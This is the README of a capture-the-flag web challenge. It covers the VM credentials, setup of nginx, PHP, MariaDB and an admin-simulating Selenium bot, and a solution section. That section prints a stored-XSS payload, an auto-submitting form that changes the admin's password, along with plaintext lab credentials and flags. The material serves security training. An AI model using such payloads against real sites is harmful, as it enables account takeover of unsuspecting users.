
# Bang 

Download VM:
* Credentials: ```user/user```, ```root/123456```
* SSH disabled
* Debian 11, 4 GB disk

# Agenda

You will study a service for exchanging messages and get access to the administrator's account. The administrator views all the latests messages, and we'll use this, but... you can't use JavaScript to obtain cookies. But this can't prevent us from gaining access to the admin's account. Right?

# Setup

*Requirements:*  **4 GB** of disk space for VM.

Put all files in **web** to folder **/var/www/html/**

```
sudo apt-get update --allow-releaseinfo-change
sudo apt-get install -y nginx php-fpm mariadb-server curl unzip xvfb libxi6 libgconf-2-4 default-jdk wget htop mc unzip php-mysql maven sudo

sudo chown www-data:www-data -R /var/www/html/
sudo chmod 755 -R /var/www/html/*
```

#### Chrome driver and selenium setup
```
wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
sudo apt install ./google-chrome-stable_current_amd64.deb
wget https://chromedriver.storage.googleapis.com/2.41/chromedriver_linux64.zip
unzip chromedriver_linux64.zip
sudo mv chromedriver /usr/bin/chromedriver
sudo chown root:root /usr/bin/chromedriver
sudo chmod +x /usr/bin/chromedriver
rm -f google-chrome-stable_current_amd64.deb
rm -f chromedriver_linux64.zip
```

#### Database setup
```
sudo mysql -e "DELETE FROM mysql.user WHERE User='';"
sudo mysql -e "DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');"
sudo mysql -e "DROP DATABASE IF EXISTS test;"
sudo mysql -e "DELETE FROM mysql.db WHERE Db='test' OR Db='test\\_%';"
sudo mysql -e "create database bang";
sudo mysql -e "CREATE USER 'bang'@'localhost' IDENTIFIED BY 'YDG6aS9Z'";
sudo mysql -e "GRANT ALL PRIVILEGES ON bang . * TO 'bang'@'localhost'";
sudo mysql -e "FLUSH PRIVILEGES";

sudo mysql bang < /var/www/html/bang.sql
sudo rm -f /var/www/html/bang.sql
```

#### Nginx configure

Change **/etc/nginx/sites-enabled/default** (php-fpm version may be different):
```
server {
        listen       80;
        root   /var/www/html/;
        autoindex on;
        index index.php;
        location ~* ^/uploads/.*.php$ {
                return 403;
        }
        location / {
            try_files $uri $uri/ /index.php;
            location = /index.php {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
                fastcgi_param  SCRIPT_FILENAME /var/www/html/$fastcgi_script_name;
                include        fastcgi_params;
            }
        }
        location ^~ /application/ {
                deny all;
        }
        location ^~ /system/ {
                deny all;
        }
        location ~ \.php$ {
            return 444;
        }
}
```

Reload nginx config
```
sudo service nginx restart
#sudo systemctl restart nginx
```



#### Bot setup
There are several command-line options for the bot:
 - -l,--login 
 - -p,--password
 - -h,--host - if not set, bot will try to get IPV4 from metadata ```169.254.169.254/latest/meta-data/public-ipv4```. You can set your host if not used in the cloud. See sample below.
 - -s,--screenshot - if set, will make a screenshot. Good for debugging.



Put bot folder to some folder on disk, for example **/home/user/bot**. 

Bot folder structure:
- /home/user/bot/src
- /home/user/bot/pom.xml


Build bot from source code:
```
cd /home/user/bot
mvn package
```

Create cron job with bot:
```
* * * * * java -jar /home/user/bot/target/bot-1.0.jar -l admin -p t1vwVbSoOb --screenshot /home/user/admin.jpg >/dev/null 2>&1

#don't forget to restart cron
sudo service cron restart
#or
systemctl restart cron
```



You can set host by yourself:

```
java -jar /home/user/bot/target/bot-1.0.jar -l admin -p t1vwVbSoOb -h 192.168.93.140 --screenshot /home/user/admin.jpg 
```

One-liner to automatically get IP address 

```bash

java -jar /home/user/bot/target/bot-1.0.jar -l admin -p t1vwVbSoOb -h `hostname --all-ip-addresses` --screenshot /home/user/admin.jpg

```





## How to check that everything works ?

1. Open the main page. You should see the working app. Try to login with ```admin/t1vwVbSoOb```
2. If you set cron correctly with screenshot option (```--screenshot /home/admin/admin.jpg```), you should get image ```/home/admin/admin.jpg```. Download it and check if you can find menus **My page, Logout** on the image - everything is fine. If not, the bot could not authorize, and you need to check your cron job.


## Solution

There is stored XSS in **latest** messages functionality. But you can steal cookie from admin user, cause HTTP_ONLY flag is set. You need to change admin password with Javascript:
1. Register and read admin messages
2. Send message to admin:
    ```html
    <form action="/user/changepassword" method="POST">
      <input type="hidden" name="password" value="123456" />
      <input type="hidden" name="cpassword" value="123456" />
    </form>
    <script>document.forms[0].submit();</script>
    ```

3. Wait some time and try to login as admin with password `123456`
4. Go to the admin panel and see the flag in the flag tab. 


Default flag is **Admin_cookie_stealer_password_change**. You can change it in ```\web\application\controllers\User.php```:

```PHP
	public function DragHU8t27C6n9ff()
	{
		$this->setSession();
        ...
		echo "You are awesome - Yu_d0nt_need_c00kies";
	}

```

